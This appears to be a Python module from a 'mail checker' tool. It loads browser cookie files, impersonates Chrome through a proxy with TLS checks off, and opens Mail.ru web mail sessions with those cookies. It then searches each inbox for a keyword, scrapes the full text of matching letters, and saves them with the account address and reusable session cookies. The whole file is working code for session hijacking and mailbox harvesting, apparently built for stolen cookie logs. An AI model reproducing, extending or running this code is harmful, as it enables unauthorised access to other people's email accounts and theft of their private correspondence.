# core/mail_checkers/module_mailru_mail_checker.py
import asyncio
from pathlib import Path
from bs4 import BeautifulSoup
from curl_cffi import requests
from requests.cookies import RequestsCookieJar
from core.lib.module_logger_manager import LoggerManager
from core.lib.module_saving_results import ResultSaver


class MailRuMailChecker:
    def __init__(
        self,
        proxy_url: str,
        cookies_file: str,
        timeout: int = 30,
        user_agent: str = None,
        logger: LoggerManager = None,
        result_saver: ResultSaver = None,
        download_html: bool = False,
    ):
        self.proxy_url = proxy_url
        self.cookies_file = cookies_file
        self.timeout = timeout
        self.user_agent = user_agent or "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
        self.logger = logger or LoggerManager("MailRuMailChecker")
        self.result_saver = result_saver
        self.download_html = download_html

        self.cookiejar: RequestsCookieJar | None = None
        self.session: requests.Session | None = None
        self.cookies_loaded = False

        # Список доменов Mail.ru группы — максимально полный
        self.mailru_domains = [
            '.mail.ru', 'mail.ru', 'e.mail.ru', 'account.mail.ru',
            '.list.ru', 'list.ru',
            '.bk.ru', 'bk.ru',
            '.inbox.ru', 'inbox.ru',
            '.internet.ru', 'internet.ru',
            '.xmail.ru', 'xmail.ru',
            'light.mail.ru', 'click.mail.ru', 'go.mail.ru',
            'auth.mail.ru', 'win.mail.ru', 'top.mail.ru',
            'my.mail.ru', 'cloud.mail.ru', 'games.mail.ru',
            'love.mail.ru', 'lady.mail.ru', 'auto.mail.ru',
            'pogoda.mail.ru', 'news.mail.ru', 'sport.mail.ru',
            'hi-tech.mail.ru', 'deti.mail.ru', 'health.mail.ru',
            'horoscope.mail.ru', 'afisha.mail.ru', 'realty.mail.ru',
            'rabota.mail.ru', 'otvet.mail.ru', 'go.mail.ru',
            'r.mail.ru', 'imgsmail.ru', 'st.mail.ru',
            'anecdot.mail.ru', 'm.mail.ru', 'touch.mail.ru'
        ]

    def load_cookies(self) -> bool:
        """Загружает куки из Netscape-файла"""
        jar = RequestsCookieJar()
        try:
            with open(self.cookies_file, "r", encoding="utf-8", errors="ignore") as f:
                for line in f:
                    line = line.strip()
                    if not line or line.startswith("#"):
                        continue
                    parts = line.split("\t")
                    if len(parts) < 7:
                        continue
                    domain, _, path, secure, expires, name, value = parts[:7]
                    expires = int(expires) if expires.isdigit() and expires != "0" else None
                    jar.set(
                        name=name,
                        value=value,
                        domain=domain,
                        path=path or "/",
                        secure=(secure == "TRUE"),
                        expires=expires,
                    )
            self.cookiejar = jar
            self.cookies_loaded = True
            self.logger.info(f"Загружено {len(jar)} кук из {Path(self.cookies_file).name}")
            return True
        except Exception as e:
            self.logger.error(f"Ошибка загрузки кук из {self.cookies_file}: {e}")
            return False

    def _get_mailru_cookies_from_original_file(self) -> list:
        """
        Возвращает ТОЛЬКО куки Mail.ru группы из исходного файла (по аналогии с Яндексом)
        Это гарантирует, что в результат попадут все нужные и валидные куки
        """
        mailru_cookies = []
        try:
            with open(self.cookies_file, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    line = line.strip()
                    if not line or line.startswith('#'):
                        continue
                    parts = line.split('\t')
                    if len(parts) >= 7:
                        domain = parts[0].lower()
                        # Проверяем, относится ли домен к Mail.ru группе
                        if any(mail_domain in domain for mail_domain in self.mailru_domains):
                            mailru_cookies.append(line)  # сохраняем оригинальную строку
            self.logger.info(f"Отфильтровано {len(mailru_cookies)} кук Mail.ru из исходного файла")
        except Exception as e:
            self.logger.error(f"Ошибка при чтении исходных кук: {e}")
        return mailru_cookies

    async def check_mail(self, search_keyword: str) -> bool:
        """Основная функция проверки Mail.ru"""
        if not self.cookies_loaded and not self.load_cookies():
            return False

        self.logger.info(f"Проверка Mail.ru | Ключевое слово: '{search_keyword}' | Прокси: {self.proxy_url}")

        try:
            self.session = requests.Session(impersonate="chrome124", timeout=self.timeout, verify=False)
            self.session.proxies = {"http": self.proxy_url, "https": self.proxy_url}
            self.session.cookies = self.cookiejar

            headers = {
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "ru-RU,ru;q=0.9,en;q=0.8",
                "Accept-Encoding": "gzip, deflate, br, zstd",
                "User-Agent": self.user_agent,
                "Referer": "https://light.mail.ru/messages/inbox",
                "Upgrade-Insecure-Requests": "1",
                "Sec-Fetch-Dest": "document",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-Site": "same-origin",
            }

            url = f"https://light.mail.ru/search/?search=&q_query={search_keyword}&st=search"
            loop = asyncio.get_running_loop()

            response = await loop.run_in_executor(
                None,
                lambda: self.session.get(url, headers=headers, allow_redirects=True)
            )

            self.logger.info(f"Ответ от light.mail.ru: {response.status_code} | {len(response.content)//1024} КБ")

            soup = BeautifulSoup(response.text, "html.parser")
            title = soup.title.string.strip() if soup.title else ""

 

            if "Поиск -" not in title:
                self.logger.warning(f"Не страница поиска: {title}")
                return False

            # Извлекаем email из заголовка
            parts = [p.strip() for p in title.split("-")]
            account_email = parts[-2] if len(parts) >= 3 else "unknown@mail.ru"
            self.logger.info(f"Валидный аккаунт: {account_email}")

            # Сохранение HTML (опционально)
            if self.download_html and self.result_saver:
                ip = await self._get_proxy_ip(loop)
                await loop.run_in_executor(
                    None,
                    self.result_saver.save_search_html,
                    response.text,
                    search_keyword,
                    self.proxy_url,
                    ip,
                )

            # Парсинг писем
            letters = []
            for row in soup.select("tr.messageline"):
                try:
                    link = row.select_one("td.messageline__subject a.messageline__link") or row.select_one("td.messageline__from a.messageline__link")
                    if not link:
                        continue
                    letter_url = link.get("href", "")
                    if letter_url and not letter_url.startswith("http"):
                        letter_url = "https://light.mail.ru" + letter_url

                    from_span = row.select_one("td.messageline__from span.messageline__body__name")
                    from_email = from_span.get_text(strip=True) if from_span else ""

                    subject_a = row.select_one("td.messageline__subject a.messageline__link")
                    subject = subject_a.get_text(strip=True) if subject_a else ""

                    date_span = row.select_one("td.messageline__date span.messageline__date__item")
                    date_text = date_span.get_text(strip=True) if date_span else ""

                    snippet_div = row.select_one("div.messageline__snippet")
                    snippet = snippet_div.get_text(strip=True) if snippet_div else ""

                    letters.append({
                        "from_email": from_email,
                        "subject": subject,
                        "snippet": snippet,
                        "date": date_text,
                        "url": letter_url,
                        "content": "",
                    })
                except Exception as e:
                    self.logger.debug(f"Ошибка парсинга строки письма: {e}")

            self.logger.info(f"Найдено писем по запросу '{search_keyword}': {len(letters)}")

            if letters:
                await self._load_letters_content(letters, loop)

                # КЛЮЧЕВОЙ МОМЕНТ: берём куки из исходного файла, а не из сессии
                session_cookies = self._get_mailru_cookies_from_original_file()

                await loop.run_in_executor(
                    None,
                    lambda: self.result_saver.save_email_results(
                        account_data={"email": account_email, "name": "", "country": ""},
                        emails_data=letters,
                        search_query=search_keyword,
                        cookies_path=self.cookies_file,
                        proxy_url=self.proxy_url,
                        session_cookies=session_cookies,  # Только нужные Mail.ru куки
                    ),
                )
                self.logger.info(f"УСПЕХ! {account_email} → найдены письма по '{search_keyword}'")
                return True

            return False

        except Exception as e:
            self.logger.error(f"Критическая ошибка в MailRuMailChecker: {e}")
            return False

    async def _get_proxy_ip(self, loop) -> str:
        try:
            resp = await loop.run_in_executor(
                None,
                lambda: self.session.get("http://api.ipify.org", timeout=5)
            )
            return resp.text.strip()
        except:
            return "unknown"

    async def _load_letters_content(self, letters: list, loop):
        tasks = []
        for letter in letters:
            if letter["url"]:
                tasks.append(
                    loop.run_in_executor(None, self._fetch_letter_body, letter["url"], letter)
                )
        await asyncio.gather(*tasks, return_exceptions=True)

    def _fetch_letter_body(self, url: str, letter_dict: dict):
        try:
            headers = {"Referer": "https://light.mail.ru/search/"}
            r = self.session.get(url, headers=headers, timeout=15)
            if r.status_code != 200:
                return
            soup = BeautifulSoup(r.text, "html.parser")
            body = soup.select_one("div.b-letter__body__content")
            if body:
                letter_dict["content"] = body.get_text(strip=True, separator="\n")
        except Exception as e:
            self.logger.debug(f"Не удалось загрузить тело письма {url}: {e}")